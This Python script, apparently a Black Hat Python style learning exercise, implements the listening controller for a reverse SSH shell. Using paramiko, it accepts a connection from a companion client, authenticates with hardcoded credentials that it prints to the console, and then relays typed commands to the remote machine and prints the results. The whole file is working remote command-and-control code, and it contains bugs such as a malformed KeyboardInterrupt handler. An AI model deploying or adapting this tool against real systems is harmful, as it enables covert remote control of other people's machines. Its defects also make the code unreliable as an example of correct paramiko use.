#!/usr/bin/python3

import paramiko # https://docs.paramiko.org/en/stable/
import os
import sys 
import socket 
import threading

# [!] SSH server to send commands to a client 
# [!!!] To use along ssh_reverse_cmd.py
    

CWD = os.path.dirname(os.path.realpath(__file__))
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, '05_test_rsa.key')) # .key files contaons RSA keys  

# Define the server as a class from the paramiko server interface  (https://docs.paramiko.org/en/stable/api/server.html)
class Server(paramiko.ServerInterface):
    def __init__(self):
        
        # Thread based on an event wait it to be set `event.set()` in order to start 
        self.event = threading.Event() # https://www.notion.so/Threading-f5bf08d6a2384e9d9429b4d41a622c54

    # check request on a channel 
    def check_channel_request(self, kind, chanid):
        # if a channel request contain a session we open it 
        if(kind == 'session'):
            return paramiko.OPEN_SUCCEEDED 
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    
    # [!] the next method is highly unsecure, RIP input sanitization 
    # Auth 
    def check_auth_password(self, user, passwd):
        print(user, passwd)
        if(user == "Rorschach" and passwd == "Sekure"):
            return paramiko.AUTH_SUCCESSFUL
        
def main():
    serverIP = "localhost"
    serverPort = 4242
    
    try:
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((serverIP, serverPort))

        maxConn = 100;
        sock.listen(maxConn)
        print(f"[+] Listening on {serverIP}:{serverPort}... ")
        
        # get the client and his IP 
        client, addr = sock.accept()
    
    except Exception as e:
        print(f"[-] Listening Failed")
        sys.exit(1)
    else:
        print(f"[+] Got connection from {addr}")

    # creat and ssh session on the client 
    bhSession = paramiko.Transport(client) # [!] this doesen't start the session ...
    bhSession.add_server_key(HOSTKEY)
    
    server = Server() # instanciate the above class 
    bhSession.start_server(server=server) # [!] ... this does
    
    chan = bhSession.accept(20)
    if chan is None:
        print("[!] no channel")
        
    print(f"Authenticated!")

    print(chan.recv(1024).decode())
    chan.send("welcome to black hat SSH")
    
    try:    
        while True:
            cmd = input("Enter command: ")
            
            if cmd == "exit":
                chan.send("exit")
                bhSession.close()
                print("exiting... ")
                break
            
            chan.send(cmd)
            r = chan.recv(8192)
            print(r.decode())
    except KeyboardInterrupt():
        bhSession.close()

if __name__ == '__main__':
    main()